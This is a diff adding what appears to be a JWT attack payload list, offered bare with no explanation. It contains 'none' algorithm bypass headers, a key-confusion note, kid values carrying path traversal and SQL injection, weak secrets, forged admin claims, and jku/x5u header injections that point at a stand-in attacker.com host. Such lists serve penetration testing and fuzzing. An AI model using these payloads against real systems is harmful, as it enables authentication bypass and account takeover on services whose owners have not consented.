@@ -1,0 +1,23 @@
+# 'none' algorithm bypass
+{"alg":"none","typ":"JWT"}
+{"alg":"none"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+# HMAC with RSA public key (Key confusion)
+{"alg":"HS256","typ":"JWT"} # Signed with PEM public key instead of secret
+# KID Injection
+{"alg":"HS256","typ":"JWT","kid":"../../../../../../../dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"admin' UNION SELECT 'key'--"}
+# Blank passwords / weak secrets
+secret=""
+secret="secret"
+secret="123456"
+# Forging tokens
+role="admin"
+claims={"user": "admin"}
+username="admin"
+sub="1"
+# Header parameter injection
+{"alg":"HS256","typ":"JWT","jwk": {"kty":"oct","k":"base64EncodedSecret"}}
+{"alg":"HS256","typ":"JWT","jku": "http://attacker.com/jwks.json"}
+{"alg":"HS256","typ":"JWT","x5u": "http://attacker.com/cert.pem"}
